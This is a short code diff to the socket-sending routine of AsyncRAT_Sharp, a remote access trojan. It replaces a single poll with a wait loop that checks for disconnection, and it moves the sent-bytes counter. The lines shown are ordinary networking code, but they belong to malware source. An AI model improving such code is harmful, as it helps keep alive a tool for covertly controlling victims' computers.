@@ -6,6 +6,7 @@ using System.Windows.Forms;
 using AsyncRAT_Sharp.Handle_Packet;
 using Microsoft.VisualBasic;
 using System.Diagnostics;
+using System.Threading.Tasks;
 
 namespace AsyncRAT_Sharp.Sockets
 {
@@ -129,8 +130,13 @@ namespace AsyncRAT_Sharp.Sockets
                         byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                         await MS.WriteAsync(buffersize, 0, buffersize.Length);
                         await MS.WriteAsync(buffer, 0, buffer.Length);
-                        Client.Poll(-1, SelectMode.SelectWrite);
-                        Client.BeginSend(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None, EndSend, null);
+                        while (!(Client.Poll(-1, SelectMode.SelectWrite)))
+                        {
+                            await Task.Delay(100);
+                            if (!Client.Connected) Disconnected();
+                        }
+                            Client.BeginSend(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None, EndSend, null);
+                            Settings.Sent += (long)MS.Length;
                     }
                 }
                 catch
@@ -144,8 +150,7 @@ namespace AsyncRAT_Sharp.Sockets
         {
             try
             {
-             int Sent = Client.EndSend(ar);
-                Settings.Sent += Sent;
+                Client.EndSend(ar);
             }
             catch
             {
